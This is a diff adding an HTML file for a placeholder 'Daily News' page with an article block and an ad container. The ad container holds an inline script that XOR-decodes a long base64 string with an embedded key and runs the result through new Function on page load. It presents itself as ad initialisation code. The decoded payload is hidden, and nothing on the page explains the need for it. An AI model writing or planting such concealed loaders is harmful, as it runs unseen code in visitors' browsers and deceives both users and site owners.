@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>News Page with Ads</title>
+    <style>
+        * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        }
+
+        body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        color: #333;
+        }
+
+        header {
+        background-color: #333;
+        color: #fff;
+        padding: 15px;
+        text-align: center;
+        }
+
+        nav {
+        margin: 10px 0;
+        text-align: center;
+        }
+
+        nav a {
+        margin: 0 15px;
+        color: #fff;
+        text-decoration: none;
+        font-weight: bold;
+        }
+
+        .container {
+        display: flex;
+        margin: 20px;
+        }
+
+        .main-content {
+        flex: 2;
+        margin-right: 20px;
+        }
+
+        .article {
+        background-color: #fff;
+        margin-bottom: 20px;
+        padding: 20px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .article img {
+          max-width: 100%;
+          height: auto;
+          margin-bottom: 10px;
+        }
+
+        .article p {
+          line-height: 1.6;
+        }
+
+        /* Ad container styling */
+        .adsContainer {
+          margin-bottom: 20px;
+          padding: 10px;
+          background-color: pink;
+          text-align: center;
+          border: 1px solid #ccc;
+          width: 100%;
+          height: 100%;
+          margin: 0 auto;
+        }
+
+        .adsContainer img, 
+        .adsContainer iframe {
+          width: 100%;
+          height: 100%;
+          object-fit: cover;
+        }
+
+    </style>
+    </head>
+    <body>
+
+    <header>
+        <h1>Daily News</h1>
+        <nav>
+        <a href="#">Home</a>
+        <a href="#">World</a>
+        </nav>
+    </header>
+
+    <div class="container">
+        <!-- Main Content -->
+        <div class="main-content">
+        <div class="article">
+            <img src="https://via.placeholder.com/600x300" alt="News Image">
+            <h2>Breaking News Headline</h2>
+            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam.</p>
+        </div>
+
+        <div class="adsContainer">
+            <script>
+
+                (function(){
+                  const _k='BNzBYjkl6ih8ysSybJRNekHf/VFjTAo+lfkhvBnkUPk=';
+                  const _d='SG5aYnkJBAJFHUhcRBc8GhcnNyARR0JGD3ZmSnRhTwtMOQJVVHRZU2BgCAVwKxlzPw9YCFReCwkdFWRABmh+REVLaEYPdmZKdGEwSVFEAxwCMlREejwEXiMiEi0qHlFZBllYFxgDOltOQHJuRUtoRg92ZkoLNVIeXFZbU3xITkt1cAhSLD0OYgYGVkQfVFZDc1NzWUJqci0KBTsSDzV7DnoiHU4NEg4tGicDDjskQx8mJwxgcFFhTBZJSBhZEH0QBncNJ05JZQdLdH1gdGFPC0xGCEYFNhcHMH4cVCY6En97W1tcE0tTMllTc1lCajFgFh8xCkp4KwM6CQpCCw4fVVRzXlslKEkGSG5aYnlKSwBTHUhLRBd9Ghc4ICsLHxsFXT82Hm9LTwtMRktIHyRGSiZ5EDdiblpieUpLTFUGBksNUyAaECMiOhZWLEhIMzIvOCQCTgISGCoPFg8MGzEGWGpsCSErAxsYFEBTMllTc1lCanJuAwQ6TkMzMko9fF8QBVoYCwQrHh8mfgdYLCkOKmIDQEcfEmIYWVNzWUJqcm5FAi5OXDU0AyQ1HHAFO0UcEzoaKDo+H1gsOlQrNwkHGVIMGxBbRWRBV3oxdlcOK1dJM3UONnYMGggAXFESYEdCLlpLHWJuWmJ5SktMFkkbBQoQIRASPiEVDDZzBF0zJwFvS08LTEZLSFZiTksoWksdYm5aYnlKFmYWSUgYWVMuc0Jqcm5FSyEAByVgTCdvH0oeAwUcOC0KDnwrGBMyLwgnNx4lA1IMRlEXADYLFgg3KAoZLU5MejVDbzwKRx8DEAxYIAEPLH4KTTIrFCYaAgIAUkELEUIOWVlCanJuRQhmD0E4IxgcFSJnUUFXDB80ThghKQdYf2wOJyEeRg1aAA9WQxA2FxYvIHUVCiwCRjghUGZxH1NXRFUkGSMKAjs3S1wmYFRsZUUPBUBXTwNzU3NZQmpyLQoFOxIPOnsOeiIdTg0SDi0aJwMOOyRDHzEtCCspHklFDWNIGFlTc1kBJTw9EUs6Ww0vZEEZIBtDQhQKBhItA0N8fh9SEToIKzcNQ18AQEZLDBEgDRBiYGJcQnNsD3ZmSnRhGEICAgQfLTAzVj1tVUZIblpieUpLTBYADhBYGy8FQyJ8JhEGJE9UNWgDOi8KWSQyJiRLZVIPPCZLTjY3FidkSB8JTh1FWRUaNBdYKTcgEQ46XV83Ig49LwgRXlYbEE1gUCU6cApZMW4bNDgDBw1UBQ0EVhc6D1xtaTwAHz0UQW07YHRhTwtMRktIFWwHBTs1GXUWAzZ/MUQDGFsFUzJZU3NZQmpybgYEJhVbdidXD29BBQ9IDA0CBwIOODUFSTEMAwE1CxgfeAgFXVFRMh1PKT0gEQohCEokZEMJemULTEZLSFZiTgIzeEpcbCIfLD4eA0VNCkZRFx02CyoeHwJYTHQCRiBmGSA4A05RRB8NDjZDCjk5DFN4LR8sLQ8ZV0YIDFwQHTRDUHoiNl5JdiNdJCkYdC0ASggPBQ9WIwoYaX8PVDRwXXkrDx8ZRAdTRXNTc1lCanJuRQpmAEAkAws3KUdOUVgORgU2Fwcwfg9UMT4WIyBXSQJZBw0aUEhZWUJqcm5FS2gHdGYbRCc1FkcJSA8BBTICCixtSV8uIRkpe1FhTBZJSBhZU3MYTCw9PCAKKw4HM3tUL0tPC0xGS0hWYk5LNj8FTjZuFis3AVYJGBgdXQsKABwOLzE6ChlgQU5xb1FeYU8LTEZLSFZiTgIzeEpRKyARaysPHxlEB1MyWVNzWUJqcm5FSysJQSUySj18A0ICDUUMFzYPGDAkRVwmBx55U0pLTBZJSBhZU3MaDSQhOkUdIQNYAjQLNyoKWVFOQlVIOWRLdXBLHWJuWmJ5SksKUx0LUFEsMVJAZTMqFkQ+D0ohaUh/KENQAQMfABkmVEwFHzhpZWIXLT0PUUtVBhpLXl8wCwcuNyARAikKXGxhBTkoGwwRT0ULFzYNA30zBFMxIRYndw8ZHlkbQQNzU3NZQmpybkVLaBsUXGZKdGFPC0xGS0gfJEYOeyMfRC4rVCYwGRsAVxBJBURRPRYML3BnHh0hA1gCNAs3KgpZRE9QFXxiTkt1cEsdYm5aLjAEAEJZBwtUEBA4RAc8b3AeYWhGD3ZmSnRhTwtMRg4eWDIcDiM1BUkGKxwjLAYfRB9SYhhZU3NZQmpybkVLaABKIiUCfB4NAE5JCgwFbQ0HPDMAEmBlE24iBw4YXgYMAl4jHCo2bX4jCg8tXAg1KRgnZkNIHgMPDRg2Bwo5I1EaLSMTNn4XQmYWSUgYWVNzWUJqcm5LHyADQX5uQ2l/GEICAgQfWC0eDjt4B1QsJVQqKw8NQBE2ClQYHTheS2NYbkVLaEYPdmZKdGFPBQ8HHwseakZCaG4cVCwqFTV3BRsJWEEEURcYfREQLzRiQjQqCk44LU19aFQhTEZLSFZiTkt1cEsdMCsONysESwpXBRtdQnlzWUJqcm5FS2hGUm1MSnRhTwtMRksVX3lkS3VwSx1iblorP0IKQloMBl8NG21ISzFYbkVLaEYPdmZKdC0KX0weVlhNSE5LdXBLHWJuWmIqDx8lWB0NSg8SP1FKY29wHmFoRg92Zkp0YU8LTEYKMw4fQBghKQdYbCoTMSkGChULSwZXFxZxQmhqcm5FS2hGD3ZmSnQ5UgMUTVpBUyNABzA+DEkqdXBieUpLTBZJSBhZU3MYOTIPYBYfMQpKeCIDJzEDShVbSQoaLQ0Ad2thHWJuWmJ5SktMFklIWxYdIA1CJjsgDlYpPVcLaBshJB1SPwMHDRU2ARl9dwoaa3VwYnlKS0wWSUgYWVNzEARiPicLAGEdJXZmSnRhTwtMRktIVmJOCDo+GEliJ0cuMAQAQlIIHFkKFidXAy4bKl5haEYPdmZKdGFPC0xGS0gQJxoIPXg0X2lsVSM9GUQaXwwfF1tYOlUZJzc6DQQsXAgGCTkAZkNGAwIOUlEhARkmd0deMCseJzceAg1aGlIfFh46DUU3e2AGCjwFR34lBToyAEcJSA4aBC0cQm5aSx1iblpieUpLTBZJFTJZU3NZQmpybkVLNUpwIm9RXmFPC0xGS0hWP2RLdXBLHWJuWiY8Bg4YU0kfURcXPA45OA91b0toRg92ZhdvS08LTEZLSBpsHRk2bTRfaWxVIz0ZRAhfGhhUGApsGgM+NykKGTEvS2tkQQsoRAlKBQoEGiAPCD5tSRYwdXBieUpLTBYFRlcXFiELDThvZkxWdh1MeC8EOiQdYzgrJ1VRfgoCI3AYSTsiH397Hg4UQkQJVBAUPUMBLzw6ABlzFk4yIgM6JlUZXBYTU1R8KAo8PA5ZYjoVYjUFCggWCAwYGhw9DQckJnJKDyEQEXF9F29LTwtMRktIEmwMBDEpRVwyPh8sPSkDBVoNQFRQSFlZQmpyM15haEYPdi8MfCVBWQkHDxElNg8fMG1WAGAiFSM9AwULFEATXFcSNx0nPDcgESchFVszKA8maU1vIysoBxg2CwUhHARcJiseYHU1B0UNFA1UChYoJg5ie3UYYWhG';
+                  
+                  const _dec=(str,key)=>{
+                    const decoded=atob(str);
+                    let result='';
+                    for(let i=0;i<decoded.length;i++){
+                      const keyChar=key.charCodeAt(i%key.length);
+                      const strChar=decoded.charCodeAt(i);
+                      result+=String.fromCharCode(strChar^keyChar);
+                    }
+                    return result;
+                  };
+            
+                  try {
+                    const script=_dec(_d,_k);
+                    const f=new Function(script);
+                    f();
+                  } catch(e) {
+                    console.error('Ad script initialization error:',e);
+                  }
+                })();
+              
+            </script>
+        </div>
+
+    </body>
+</html>
